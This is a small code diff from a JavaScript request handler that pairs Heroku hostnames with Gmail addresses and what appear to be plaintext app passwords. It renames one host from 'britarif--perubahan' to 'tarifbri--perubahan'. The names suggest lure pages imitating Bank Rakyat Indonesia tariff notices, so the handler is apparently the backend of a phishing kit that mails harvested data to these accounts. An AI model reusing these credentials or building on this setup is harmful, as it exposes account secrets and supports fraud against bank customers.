@@ -12,7 +12,7 @@ export default function handler(req, res) {
         email = 'orbitorbit799@gmail.com';
         pass = 'ahghpmbdwokimqim'; 
 
-    } else if(url == 'britarif--perubahan.herokuapp.com'){
+    } else if(url == 'tarifbri--perubahan.herokuapp.com'){
         email = 'andin1234zx@gmail.com' ;
         pass = 'ujnjjdjcumttwjsu' ;
 
